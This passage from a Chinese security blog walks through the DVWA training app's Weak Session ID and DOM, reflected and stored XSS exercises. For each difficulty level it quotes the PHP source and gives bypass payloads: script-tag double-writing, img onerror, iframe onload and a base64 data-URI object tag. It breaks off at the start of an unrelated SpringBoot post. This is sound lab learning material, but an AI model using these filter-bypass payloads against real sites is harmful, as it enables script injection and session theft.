<p>服务器端维护所有在线用户的Session，此时的认证，只需要知道是哪个用户在浏览当前的页面即可。为了告诉服务器应该使</p>
<p>用哪一个Session，浏览器需要把当前用户持有的SessionID告知服务器。用户拿到session id就会加密后保存到 cookies 上，</p>
<p>之后只要cookies随着http请求发送服务器，服务器就知道你是谁了。SessionID一旦在生命周期内被窃取，就等同于账户失窃。</p>
<p>Session利用的实质 ：</p>
<p>由于SessionID是用户登录之后才持有的唯一认证凭证，因此黑客不需要再攻击登陆过程(比如密码)，就可以轻易获取访问权</p>
<p>限，无需登录密码直接进入特定用户界面， 进而查找其他漏洞如XSS、文件上传等等。</p>
<p>Session劫持 : 就是一种通过窃取用户SessionID，使用该SessionID登录进目标账户的攻击方法，此时攻击者实际上是使用</p>
<p>了目标账户的有效Session。如果SessionID是保存在Cookie中的，则这种攻击可以称为Cookie劫持。SessionID还可以保存</p>
<p>在URL中，作为一个请求的一个参数，但是这种方式的安全性难以经受考验。</p>
<h3 id="low-2"><a href="#low-2" class="headerlink" title="low"></a>low</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$html = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'REQUEST_METHOD'</span>] == <span class="string">"POST"</span>) &#123;</span><br><span class="line">    $cookie_value = sha1(mt_rand() . time() . <span class="string">"Impossible"</span>);</span><br><span class="line">    setcookie(<span class="string">"dvwaSession"</span>, $cookie_value, time()+<span class="number">3600</span>, <span class="string">"/vulnerabilities/weak_id/"</span>, $_SERVER[<span class="string">'HTTP_HOST'</span>], <span class="keyword">true</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>bp抓包重放，发现重放一次dvwaSession+1，清除浏览器缓存之后，再重放一次，发现依旧+1，绕过了密码验证</p>
<h3 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$html = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'REQUEST_METHOD'</span>] == <span class="string">"POST"</span>) &#123;</span><br><span class="line">    $cookie_value = time();</span><br><span class="line">    setcookie(<span class="string">"dvwaSession"</span>, $cookie_value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>发现这次dvwaSession是时间戳，通过设置时间戳，可知诱骗受害者在某个时间点基进行点击<br>构造时间戳就行</p>
<h3 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$html = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'REQUEST_METHOD'</span>] == <span class="string">"POST"</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span> ($_SESSION[<span class="string">'last_session_id_high'</span>])) &#123;</span><br><span class="line">        $_SESSION[<span class="string">'last_session_id_high'</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $_SESSION[<span class="string">'last_session_id_high'</span>]++;</span><br><span class="line">    $cookie_value = md5($_SESSION[<span class="string">'last_session_id_high'</span>]);</span><br><span class="line">    setcookie(<span class="string">"dvwaSession"</span>, $cookie_value, time()+<span class="number">3600</span>, <span class="string">"/vulnerabilities/weak_id/"</span>, $_SERVER[<span class="string">'HTTP_HOST'</span>], <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>high级别使用了PHP setcookie()函数，来设置cookie:<br><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">setcookie(<span class="type">name</span>,<span class="keyword">value</span>,expire,<span class="type">path</span>,<span class="keyword">domain</span>,secure,httponly)</span><br><span class="line"> 参数 	             描述</span><br><span class="line"><span class="type">name</span> 	    必需。规定cookie的名称。</span><br><span class="line"><span class="keyword">value</span> 	    必需。规定cookie的值。</span><br><span class="line">expire   	可选。规定cookie的有效期。</span><br><span class="line"><span class="type">path</span> 	    可选。规定cookie的服务器路径。</span><br><span class="line"><span class="keyword">domain</span> 	    可选。规定cookie的域名。</span><br><span class="line">secure 	    可选。规定是否通过安全的HTTPS连接来传输cookie。</span><br><span class="line">httponly 	可选。规定是否Cookie仅可通过HTTP协议访问。</span><br></pre></td></tr></table></figure><br>抓包发现，dvwaSesion值很像md5加密，使用md5解密，发现是对从零开始的整数进行加密；构造payload使用火狐提交。</p>
<h3 id="impossible-5"><a href="#impossible-5" class="headerlink" title="impossible"></a>impossible</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$html = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'REQUEST_METHOD'</span>] == <span class="string">"POST"</span>) &#123;</span><br><span class="line">    $cookie_value = sha1(mt_rand() . time() . <span class="string">"Impossible"</span>);</span><br><span class="line">    setcookie(<span class="string">"dvwaSession"</span>, $cookie_value, time()+<span class="number">3600</span>, <span class="string">"/vulnerabilities/weak_id/"</span>, $_SERVER[<span class="string">'HTTP_HOST'</span>], <span class="keyword">true</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>$cookie_value采用随机数+时间戳+固定字符串”Impossible”，再进行sha1运算，完全不能猜测到dvwaSession的值。</p>
<h2 id="XSS-DOM"><a href="#XSS-DOM" class="headerlink" title="XSS DOM"></a>XSS DOM</h2><h3 id="low-3"><a href="#low-3" class="headerlink" title="low"></a>low</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># No protections, anything goes</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>没有任何过滤和限制，只有个下拉列表，bp抓包<br>payload<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p>
<h3 id="medium-2"><a href="#medium-2" class="headerlink" title="medium"></a>medium</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">"default"</span>, $_GET ) &amp;&amp; !is_null ($_GET[ <span class="string">'default'</span> ]) ) &#123;</span><br><span class="line">    $default = $_GET[<span class="string">'default'</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Do not allow script tags</span></span><br><span class="line">    <span class="keyword">if</span> (stripos ($default, <span class="string">"&lt;script"</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        header (<span class="string">"location: ?default=English"</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>stripos</code>查找 “php” 在字符串中第一次出现的位置<br>过滤了<code>&lt;script&gt;</code>标签</p>
<p>闭合<code>&lt;/option&gt;&lt;/select&gt;</code>标签构造xss事件</p>
<p>payload:<code>English&gt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(/xss/)&gt;</code></p>
<h3 id="high-2"><a href="#high-2" class="headerlink" title="high"></a>high</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">"default"</span>, $_GET ) &amp;&amp; !is_null ($_GET[ <span class="string">'default'</span> ]) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># White list the allowable languages</span></span><br><span class="line">    <span class="keyword">switch</span> ($_GET[<span class="string">'default'</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"French"</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"English"</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"German"</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"Spanish"</span>:</span><br><span class="line">            <span class="comment"># ok</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            header (<span class="string">"location: ?default=English"</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>使用了switch语句进行限制<br>payload<code>English#&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p>
<h3 id="impossible-6"><a href="#impossible-6" class="headerlink" title="impossible"></a>impossible</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Don't need to do anything, protction handled on the client side</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们查看源代码，发现这里对我们输入的参数并没有进行URL解码，所以我们输入的任何参数都是经过URL编码，然后直接赋值给option标签。所以，就不存在XSS漏洞了</p>
<h2 id="XSS-Reflected"><a href="#XSS-Reflected" class="headerlink" title="XSS Reflected"></a>XSS Reflected</h2><h3 id="low-4"><a href="#low-4" class="headerlink" title="low"></a>low</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">"X-XSS-Protection: 0"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Hello '</span> . $_GET[ <span class="string">'name'</span> ] . <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<h3 id="medium-3"><a href="#medium-3" class="headerlink" title="medium"></a>medium</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">"X-XSS-Protection: 0"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = str_replace( <span class="string">'&lt;script&gt;'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>过滤了<code>&lt;script&gt;</code>,<code>str_replace</code>很弱<br>payload<code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/script&gt;</code>，大小写混写也可以</p>
<h3 id="high-3"><a href="#high-3" class="headerlink" title="high"></a>high</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">"X-XSS-Protection: 0"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = preg_replace( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>使用了正则且避免了双写，使用<code>img</code>标签或者<code>iframe</code>标签<br>payload<code>&lt;img src=1 onerror=alert(/xss/)&gt;</code>或<code>&lt;iframe onload=alert(/xss/)&gt;</code>或<code>&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;&lt;/object&gt;</code></p>
<h3 id="impossible-7"><a href="#impossible-7" class="headerlink" title="impossible"></a>impossible</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = htmlspecialchars( $_GET[ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>PHP <code>htmlspecialchars()</code>函数<br><figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="meta">&amp; （和号）成为 &amp;amp;</span></span><br><span class="line"><span class="string">" （双引号）成为 &amp;quot; </span></span><br><span class="line">' （单引号）成为 &amp;apos;//生效需要加 ENT_QUOTES 参数</span><br><span class="line">&lt; （小于）成为 &amp;lt;</span><br><span class="line">&gt; （大于）成为 &amp;gt;</span><br></pre></td></tr></table></figure><br>可以看到，Impossible Security Level的代码使用htmlspecialchars函数把预定义的字符:<code>&amp; &quot; &#39; &lt; &gt;</code></p>
<p>转换为HTML实体，防止浏览器将其作为HTML元素。从而防治了反射型XSS利用和危害。</p>
<h2 id="XSS-Stored"><a href="#XSS-Stored" class="headerlink" title="XSS Stored"></a>XSS Stored</h2><h3 id="low-5"><a href="#low-5" class="headerlink" title="low"></a>low</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = stripslashes( $message );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $message ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $name ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>trim(string,charlist)</code>： 移除string字符两侧的预定义字符，预定义字符包括\t 、 \n 、\x0B 、\r以及空格，可选参数charlist支持添加额外需要删除的字符</p>
<p><code>stripslashes(string)</code>： 去除掉string字符的反斜杠＼</p>
<p><code>mysqli_real_escape_string(string,connection)</code> ：函数会对字符串string中的特殊符号（\x00，\n，\r，\，‘，“，\x1a）进行转义。</p>
<p><code>$GLOBALS</code>：引用全局作用域中可用的全部变量。$GLOBALS 这种全局变量用于在 PHP 脚本中的任意位置访问全局变量（从函数或方法中均可）。PHP 在名为 $GLOBALS[index] 的数组中存储了所有全局变量。变量的名字就是数组的键。</p>
<p>可以看出，low级别的代码对我们输入的<code>message</code>和<code>name</code>并没有进行XSS过滤，而且数据存储在数据库中，存在比较明显的存储型XSS漏洞</p>
<p>我们输入 1 和 <code>&lt;script&gt;alert(&#39;hack&#39;)&lt;/script&gt;</code>，可以看到，我们的js代码立即就执行了</p>
<h3 id="medium-4"><a href="#medium-4" class="headerlink" title="medium"></a>medium</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = strip_tags( addslashes( $message ) );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $message ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = str_replace( <span class="string">'&lt;script&gt;'</span>, <span class="string">''</span>, $name );</span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $name ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>addslashes(string)</code> ：函数返回在预定义字符之前添加反斜杠的字符串，预定义字符 ‘ 、” 、\ 、NULL</p>
<p><code>strip_tags(string)</code> ：函数剥去string字符串中的 HTML、XML 以及 PHP 的标签</p>
<p><code>htmlspecialchars(string)</code>： 把预定义的字符 “&lt;” （小于）、 “&gt;” （大于）、&amp; 、‘’、“” 转换为 HTML 实体，防止浏览器将其作为HTML元素</p>
<p>当我们再次输入1 和<code>&lt;script&gt;alert(&#39;hack&#39;)&lt;/script&gt;</code> ，strip_tags函数把<code>&lt;script&gt;</code>标签给剥除了，<code>addslashes</code>函数把 ‘  转义成了  \’</p>
<p>虽然<code>Message</code>参数把所有的XSS都给过滤了，但是name参数只是过滤了<code>&lt;script&gt;</code>标签而已，我们依然可以在name参数进行注入</p>
<p>可是发现<code>name</code>参数对长度有限制，最大长度是10</p>
<p>所以我们想到了抓包，然后进行篡改，我们输入如下的，然后抓包</p>
<p>如下框中的数据就是 <code>&lt;script&gt;al</code> 经过URL编码后的数据</p>
<p>我们需要将其修改为 <code>&lt;SCRIPT&gt;alert(&#39;hack&#39;)&lt;/SCRIPT&gt;</code> 经过URL编码后的数据</p>
<p>提交后，就可以看到弹出此框了，说明我们的js代码执行了</p>
<h3 id="high-4"><a href="#high-4" class="headerlink" title="high"></a>high</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = strip_tags( addslashes( $message ) );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $message ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = preg_replace( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, $name );</span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $name ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看到，high级别只是在medium级别上，name参数用了正则表达式进行过滤而已，我们仍然可以在name参数做手脚，抓包，然后改包，只不过这次改成<code>&lt;img src=1  onerror=alert(&#39;hack&#39;)&gt;</code></p>
<p>然后将 <code>&lt;img src=1  onerror=alert(&#39;hack&#39;)&gt;</code>进行URL编码</p>
<h3 id="impossible-8"><a href="#impossible-8" class="headerlink" title="impossible"></a>impossible</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = stripslashes( $message );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $message ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = stripslashes( $name );</span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $name ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">    $name = htmlspecialchars( $name );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );'</span> );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">':message'</span>, $message, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">':name'</span>, $name, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看到，这次impossible在high级别的基础上对name参数也进行了更严格的过滤，导致name参数也无法进行XSS攻击。而且使用了Anti-CSRF token防止CSRF攻击，完全杜绝了XSS漏洞和CSRF漏洞</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>PHP开发</category>
        <category>审计</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot2基础入门</title>
    <url>/2021/05/18/SpringBoot2/</url>
    <content><![CDATA[<h1 id="SpringBoot2入门"><a href="#SpringBoot2入门" class="headerlink" title="SpringBoot2入门"></a>SpringBoot2入门</h1><h2 id="系统要求"><a href="#系统要求" class="headerlink" title="系统要求"></a>系统要求</h2><ul>
<li><a href="https://www.java.com/" target="_blank" rel="noopener">Java 8</a> &amp; 兼容java14 .</li>
